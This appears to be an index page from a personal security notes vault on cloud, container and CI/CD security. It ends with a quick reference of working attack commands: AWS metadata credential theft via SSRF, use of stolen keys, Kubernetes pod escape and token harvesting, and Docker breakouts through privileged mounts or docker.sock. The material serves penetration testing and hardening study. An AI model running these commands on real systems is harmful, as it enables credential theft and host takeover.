---
type: section
room: green
tags: [green/notes]
---

# Green: Monographs

> [!quote]
> *"The Irregulars — they can go everywhere, see everything, overhear everyone."*
> — *A Study in Scarlet*

DevSecOps, cloud security, and infrastructure hardening. The Irregulars are everywhere — inside pipelines, containers, cloud accounts, and Kubernetes clusters — watching for misconfigurations and vulnerabilities before they reach production.

---

## Subject Hubs

### Cloud Security
| Cloud / Subject | Note | Framework |
|----------------|------|-----------|
| AWS Security Fundamentals | [[Cloud - AWS]] | AWS Well-Architected |
| Azure Security | [[Cloud - Azure]] | Azure Security Benchmark |
| GCP Security | [[Cloud - GCP]] | GCP Security Foundations |
| Cloud Pentesting | [[Cloud - Pentest]] | MITRE ATT&CK Cloud |
| IAM Misconfiguration | [[Cloud - IAM]] | CIS Cloud Benchmarks |
| S3 / Storage Misconfig | [[Cloud - Storage]] | — |
| Cloud Metadata Service SSRF | [[Cloud - IMDS]] | T1552.005 |

### Container & Kubernetes
| Subject | Note |
|---------|------|
| Docker Security | [[Container - Docker]] |
| Kubernetes Security | [[Container - Kubernetes]] |
| Container Escape Techniques | [[Container - Escape]] |
| Pod Security Standards | [[Container - Pod Security]] |
| Image Hardening | [[Container - Image Hardening]] |

### CI/CD Pipeline Security
| Subject | Note |
|---------|------|
| GitHub Actions Security | [[Pipeline - GitHub Actions]] |
| Supply Chain Attacks | [[Pipeline - Supply Chain]] |
| Secrets in Pipelines | [[Pipeline - Secrets]] |
| SBOM & Dependency Management | [[Pipeline - SBOM]] |

### Infrastructure Hardening
| Subject | Note |
|---------|------|
| Linux Hardening (CIS) | [[Hardening - Linux]] |
| Windows Hardening (CIS) | [[Hardening - Windows]] |
| Network Segmentation | [[Hardening - Network]] |
| Firewall Rules & ACLs | [[Hardening - Firewall]] |

---

## Cloud Attack Quick Reference

### AWS Common Misconfigurations
```bash
# IMDS v1 SSRF (from SSRF vulnerability in app)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
# Returns: AccessKeyId, SecretAccessKey, Token → full AWS API access as that role

# S3 public bucket enumeration
aws s3 ls s3://<bucket-name> --no-sign-request
aws s3 cp s3://<bucket-name>/<file> . --no-sign-request

# Enumerate permissions with stolen credentials
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name <user>
aws iam get-policy-version --policy-arn <arn> --version-id <version>

# Privilege escalation via iam:PassRole
# Create Lambda with admin role → invoke
```

### Kubernetes Misconfigurations
```bash
# Check if service account has excess permissions
kubectl auth can-i --list -n default

# Escape via privileged pod
kubectl run priv --image=ubuntu --overrides='{"spec":{"containers":[{"name":"priv","image":"ubuntu","securityContext":{"privileged":true},"command":["sleep","3600"]}]}}' -it

# Inside privileged pod — mount host filesystem
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Steal service account tokens from other pods
for pod in $(kubectl get pods -o name); do
  kubectl exec $pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
done
```

### Docker Escapes
```bash
# Check if in a container
cat /proc/1/cgroup | grep docker
ls /.dockerenv

# Check if privileged
ip link add dummy0 type dummy 2>&1  # no error = privileged

# Privileged container escape — mount host disk
fdisk -l  # find host disk device
mkdir /mnt/host && mount /dev/sda1 /mnt/host
chroot /mnt/host bash
# Now in host filesystem as root

# Socket mount escape (docker.sock exposed)
ls -la /var/run/docker.sock
docker -H unix:///var/run/docker.sock run -it --privileged -v /:/host ubuntu chroot /host bash
```

---

## Conventions

- **Cloud notes:** `Cloud - <Provider/Topic>.md`
- **Container notes:** `Container - <Topic>.md`
- **Pipeline notes:** `Pipeline - <Topic>.md`
- **Hardening notes:** `Hardening - <OS/Topic>.md`
- **Tags:** `#green/<category>` e.g. `#green/cloud`, `#green/container`, `#green/pipeline`

↩ [[Green]] · [[Mind Palace]]